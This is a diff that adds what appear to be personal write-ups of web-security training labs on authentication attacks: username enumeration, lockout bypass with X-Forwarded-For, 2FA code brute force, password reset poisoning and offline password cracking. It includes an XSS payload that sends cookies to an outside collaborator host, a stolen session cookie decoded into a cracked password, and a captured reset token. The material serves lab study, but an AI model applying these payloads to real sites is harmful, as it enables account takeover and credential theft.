@@ -63,6 +63,7 @@ successful login. --> We can test one combination and then login with the
 provided credentials.
 
 Prepare two lists
+
 - **Users:** `carlos` and `wiener` turn by turn (100x)
 - **Passwords:** `entry from PW list` and `peter` switching each time.
 
@@ -85,4 +86,66 @@ q
 In the Intruder Settings set the max concurrent Payloads to 1 and a delay of  
 `300 ms`.
 
+## Username enumeration via account lock
 
+1. Try to brute force Usernames 3 times
+1. One response has a longer length.
+  - Error Message: `You have made too many incorrect login attempts. Please try again in 1 minute(s).`
+  - --> We have our user
+1. Try PW Brute force using `X-Forwarded-For` Header
+
+```
+X-Forwarded-For: §1§
+
+username=accounting&password=§bla§
+```
+
+It seems that the lock has no effect if the real credentials are supplied.
+The answer with the smallest response contains the valid credentials.
+
+![no-lock](img/no-lock.png)
+
+## 2FA broken logic
+
+Brute force in order:
+
+1. PW
+2. 2FA code (using the `session` and `verify` cookie values from carlos)
+
+```
+mfa-code=§1111§
+```
+
+Intruder > Sniper: Set payload from 0000 to 9999 with 1 as step.
+
+
+## Offline password cracking
+
+Place XSS in comments of posts
+
+```
+<img src=x onerror=this.src='http://<BURP-COLLAB-URL>/?'+document.cookie;>
+```
+
+Look for an answer from carlos:
+
+```
+GET /?secret=xHtfxrM68cuhFuEY30ETrSrX0eAp9hrR;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
+
+# stay loggen loggen in decode:
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+Use <https://crackstation.net/> to check the hash.  --> `onceuponatime` (md5)
+
+
+## Password reset poisoning via middleware
+
+In this lab we can manipulate the `X-Forwarded-Host` header to generate password 
+reset links for a host we control.
+
+1. Repeater for the `POST /forgot-password` request
+1. set username to carlos
+1. add `X-Forwarded-Host: exploit-0a2f00cd041f7e3f823151b001690060.exploit-server.net/exploit`
+1. Access the server log
+      `GET /exploit/forgot-password?temp-forgot-password-token=SOEFGdL2dqdeCXu0xrqN2ndOQwXSGwnp HTTP/1.1`
